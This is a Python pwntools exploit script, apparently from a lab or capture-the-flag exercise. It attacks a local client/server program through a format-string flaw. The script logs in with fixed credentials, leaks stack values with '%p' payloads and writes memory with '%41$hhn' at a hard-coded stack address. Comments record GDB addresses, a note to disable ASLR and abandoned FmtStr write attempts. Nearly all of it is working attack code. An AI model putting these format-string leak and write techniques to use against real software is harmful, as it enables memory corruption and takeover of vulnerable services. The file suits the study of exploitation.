from pwn import *

context.clear(arch = 'amd64')
# Disable ASLR !

server = process('bin/server')
client = process(['bin/client', '127.0.0.1', '1337'])

login = "login Acidburn\n"
passw = "pass CrashOverride\n"
client.sendline(login)
client.sendline(passw)
log.info("server after login %s" % server.recv(timeout=1))
log.info("client after login %s" % client.recv(timeout=0.5))


# Function called in order to send a payload
def send_payload(payload):
    log.info("payload = %s" % ("get " + repr(payload)))
    client.sendline("get " + payload)
    server_returns = server.recv()
    log.info("server returns: %s" % (server_returns))
    return server_returns

# Create a FmtStr object and give to him the function
#format_string = FmtStr(execute_fmt=send_payload, padlen=4)
#format_string.write(0x00007fffffffcd58, 0xAAAAAAAAAAAAAAAA) # write 0x1337babe at 0x0
# format_string.write(0x1337babe, 0x0) # write 0x0 at 0x1337babe
# format_string.execute_writes()

#test1 = 'get \x06\x05\x04\x08\x07\x05\x04\x08\x08\x05\x04\x08\t\x05\x04\x08%174c%5$hhn%252c%6$hhn%125c%7$hhn%220c%8$hhn'
def exectue_one(string):
    s = string
    client.sendline(s)
    print server.recv()
    client.recv()

def get_stack(size):
    #s = 'get %' + str(i) + '$11x'
    s = 'put ' + 'a%p.'*size + "187"
    client.sendline(s)
    res = server.recv()
    stack = res.split('.')
    client.recv()
    return stack

r = range(35, 45)

s = "put a"
#for i in r:
    #s += "%" + str(i + 1) +"$p."

# long long n is at %40$p
# long long fileSize at %41$p

# in GDB: stack address of long long n: 0x7fffffffcb10 = 140737488341776
# in python: 0x7fffffffcac8 = 140737488341704
# normal: 0x7fffffffca98
# gdb making sure same env variables: 0x7fffffffcb80 = 140737488341888
# (gdb) unset environment LINES
# (gdb) unset environment COLUMNS

# magic happens here
# s  += "%41$p%42$p%43$p%44$p%45$p%46$p%47$p%48$p"
s  += "%41$hhn"
#s += " " + str(187)
s += " " + str(140737488341888) # address of rip 0x00007fffffffcb58 // a8 : str(140737488341928)
client.sendline(s)
res = server.recv()
print res
print client.recv()

j = 0
for i in r:
    #print str(i + 1) + " " + stack[j+1]
    j += 1

client.sendline("ls")
print server.recv()
print client.recv()



# Get final output
#log.info("server cleanup %s" % server.recv())
#log.info("client cleanup %s" % client.recv())

# Clean up
client.close()
server.close()
